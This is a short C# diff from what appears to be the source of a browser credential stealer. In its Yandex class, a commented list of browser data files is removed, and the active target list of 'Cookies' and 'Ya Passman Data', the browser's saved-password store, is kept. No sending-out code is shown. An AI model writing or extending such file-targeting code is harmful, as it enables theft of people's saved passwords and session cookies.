@@ -7,7 +7,6 @@ namespace WorkBrowser
     class Yandex : WorkBrowser
     {
 
-        //private string[] _NameFindFiles = { "Login Data", "Login Data For Account", "History", "sessionCheckpoints.json", "cookies.sqlite", "Cookies", "Network Persistent State", "Reporting and NEL", "TransportSecurity", "Trust Tokens" };
         private string[] _NameFindFiles = { "Cookies", "Ya Passman Data"};
         public Yandex(string userpath)
         {
